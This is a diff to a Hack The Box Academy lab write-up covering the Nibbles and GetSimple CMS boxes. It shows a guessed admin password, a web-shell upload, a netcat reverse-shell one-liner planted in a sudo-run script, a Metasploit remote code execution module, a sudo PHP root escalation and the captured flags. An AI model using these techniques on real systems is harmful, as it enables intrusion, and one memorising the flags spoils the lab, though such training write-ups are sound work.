@@ -238,7 +238,7 @@ user2@gettingstartedprivesc-476470-65b4ccfbdf-wtx99:/$ cat /home/user2/flag.txt
 HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
 ```
 
-**Answer:** ``
+**Answer:** `HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}`
 
 ### Question 2:
 ![](./attachments/Pasted%20image%2020221117133914.png)
@@ -344,7 +344,7 @@ HTB{pr1v1l363_35c4l4710n_2_r007}
 ---
 ## 
 ### Question:
-![](Pasted%20image%2020230119122416.png)
+![](./attachments/Pasted%20image%2020230119122416.png)
 *Hint: Check out what was REDACTED from the above nmap output. The answer should be in the same place.*
 
 ```
@@ -368,20 +368,253 @@ Nmap done: 1 IP address (1 host up) scanned in 9.42 seconds
 ---
 ## 
 ### Question:
-![](Pasted%20image%2020230119125741.png)
+![](./attachments/Pasted%20image%2020230119125741.png)
+
+We get a website only containing "Hello world!", let's have a look at the source code:
+
+![](./attachments/Pasted%20image%2020230123102024.png)
+
+Let's try and access `/nibbleblog/`
+
+![](./attachments/Pasted%20image%2020230123102137.png)
+
+We get a more interesting page, but after clicking around, it is clear that this page doesn't contain anything interesting either. Let's use `gobuster` to find some subdirectories.
 
 ```
-
+┌──(kali㉿kali)-[~]
+└─$ sudo gobuster dir -u http://10.129.218.163/nibbleblog/ -w /usr/share/dirb/wordlists/common.txt 
+[sudo] password for kali: 
+===============================================================
+Gobuster v3.3
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.218.163/nibbleblog/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.3
+[+] Timeout:                 10s
+===============================================================
+2023/01/23 04:24:57 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 304]
+/.htaccess            (Status: 403) [Size: 309]
+/.htpasswd            (Status: 403) [Size: 309]
+/admin                (Status: 301) [Size: 327] [--> http://10.129.218.163/nibbleblog/admin/]
+/admin.php            (Status: 200) [Size: 1401]
+/content              (Status: 301) [Size: 329] [--> http://10.129.218.163/nibbleblog/content/]
+/index.php            (Status: 200) [Size: 2987]
+/languages            (Status: 301) [Size: 331] [--> http://10.129.218.163/nibbleblog/languages/]
+/plugins              (Status: 301) [Size: 329] [--> http://10.129.218.163/nibbleblog/plugins/]
+/README               (Status: 200) [Size: 4628]
+/themes               (Status: 301) [Size: 328] [--> http://10.129.218.163/nibbleblog/themes/]
+Progress: 4610 / 4615 (99.89%)===============================================================
+2023/01/23 04:25:42 Finished
 ```
+
+`/admin.php` contain an admin login page.
+
+![](./attachments/Pasted%20image%2020230123105525.png)
+
+We can use [CeWL](https://github.com/digininja/CeWL) to generate a list of words from the page. 
+
+`nibbles` appear on the page, let's try that as the password.
+
+User:pass `admin:nibbles`
+
+It worked, we got in:
+
+![](./attachments/Pasted%20image%2020230123110923.png)
+
+If we go to `plugins > My Image > Configure` we can upload a file.
+
+![](./attachments/Pasted%20image%2020230123110750.png)
+
+`/content` contain a file structure.
+
+![](./attachments/Pasted%20image%2020230123103449.png)
+
+Let's try and upload `phpbash.php`.
+
+In `/content/private/plugins/my_image/` we see a new file appear.
+
+![](./attachments/Pasted%20image%2020230123105341.png)
+
+We got a shell.
+
+![](./attachments/Pasted%20image%2020230123111302.png)
 
 **Answer:** `79c03865431abf47b90ef24b9695e148`
 
 ---
 ## 
 ### Question:
-*Hint: *
+![](./attachments/Pasted%20image%2020230123111430.png)
 
-**Answer:** ``
+Using command `sudo -l` we can see that we can run `/home/nibbler/personal/stuff/monitor.sh` as root.
+
+![](./attachments/Pasted%20image%2020230123112104.png)
+
+We can create the file and insert a reverse shell using `echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.218 8880 >/tmp/f' > personal/stuff/monitor.sh`
+
+Before executing the script, we set up a `netcat` listener to catch the shell.
+
+```
+┌──(kali㉿kali)-[~/HTB/Nibbles]
+└─$ nc -lvnp 8880
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::8880
+Ncat: Listening on 0.0.0.0:8880
+```
+
+Now we can execute the script with `sudo`.
+
+![](./attachments/Pasted%20image%2020230123114637.png)
+
+We received the reverse shell in our `netcat` terminal window.
+
+```
+┌──(kali㉿kali)-[~/HTB/Nibbles]
+└─$ nc -lvnp 8880
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::8880
+Ncat: Listening on 0.0.0.0:8880
+Ncat: Connection from 10.129.119.94.
+Ncat: Connection from 10.129.119.94:37742.
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# cat /root/root.txt
+de5e5d6619862a8aa5b9b212314e0cdd
+```
+
+**Answer:** `de5e5d6619862a8aa5b9b212314e0cdd`
+
+---
+## 
+### Question 1:
+![](./attachments/Pasted%20image%2020230123135551.png)
+*Hint: Use SearchSploit to find relevant exploits after finishing your enumeration.*
+
+```
+┌──(kali㉿kali)-[~/HTB/GettingStartedKnowledgeCheck]
+└─$ nmap -n -sV -sC -p- -oA nmap_sV_sC_full_scan 10.129.215.234  
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-23 06:37 EST
+Nmap scan report for 10.129.215.234
+Host is up (0.076s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 4c73a025f5fe817b822b3649a54dc85e (RSA)
+|   256 e1c056d052042f3cac9ae7b1792bbb13 (ECDSA)
+|_  256 523147140dc38e1573e3c424a23a1277 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Welcome to GetSimple! - gettingstarted
+| http-robots.txt: 1 disallowed entry 
+|_/admin/
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 2694.37 seconds
+```
+
+Opening the web page, we get a page that looks broken, when looking at the source code we see a script being loaded from `gettingstarted.htb`.
+
+![](./attachments/Pasted%20image%2020230123142315.png)
+
+When visiting the URL, we get a page not found error. 
+
+We will add it to our `/etc/hosts` file. 
+
+Now, when reloading the page, it looks way better.
+
+![](./attachments/Pasted%20image%2020230123142642.png)
+
+The first link on the page redirects us to some `GetSimple CMS Documentation`.
+
+This must be the CMS used to host the page. Let's search for an exploit using Metasploit.
+
+```
+msf6 > search getsimple
+
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank       Check  Description
+   -  ----                                              ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/get_simple_cms_upload_exec    2014-01-04       excellent  Yes    GetSimpleCMS PHP File Upload Vulnerability
+   1  exploit/multi/http/getsimplecms_unauth_code_exec  2019-04-28       excellent  Yes    GetSimpleCMS Unauthenticated RCE
+```
+
+There is an RCE vulnerability from 2019. Let's try that.
+
+```
+msf6 > use 1
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > options
+
+Module options (exploit/multi/http/getsimplecms_unauth_code_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][..
+                                         .]
+   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasplo
+                                         it-framework/wiki/Using-Metasploit
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the cms
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   GetSimpleCMS 3.3.15 and before
+
+
+msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > set rhost 10.129.215.234
+rhost => 10.129.215.234
+msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > set lhost 10.10.14.218
+lhost => 10.10.14.218
+msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > run
+
+[*] Started reverse TCP handler on 10.10.14.218:4444 
+[*] Sending stage (39927 bytes) to 10.129.215.234
+[*] Meterpreter session 1 opened (10.10.14.218:4444 -> 10.129.215.234:54888) at 2023-01-23 07:50:10 -0500
+
+meterpreter > cat /home/mrb3n/user.txt
+7002d65b149b0a4d19132a66feed21d8
+```
+
+We got the user flag.
+
+**Answer:** `7002d65b149b0a4d19132a66feed21d8`
+
+
+### Question 2:
+![](./attachments/Pasted%20image%2020230123135605.png)
+*Hint: Run a script such as LinEnum or LinPEAS to assist with finding common local privilege escalation vectors.*
+
+```
+sudo php -r "system('/bin/bash');"
+cat /root/root.txt
+f1fba6e9f71efb2630e6e34da6387842
+```
+
+**Answer:** `f1fba6e9f71efb2630e6e34da6387842`
 
 ---
 **Tags:** [[Hack The Box Academy]]
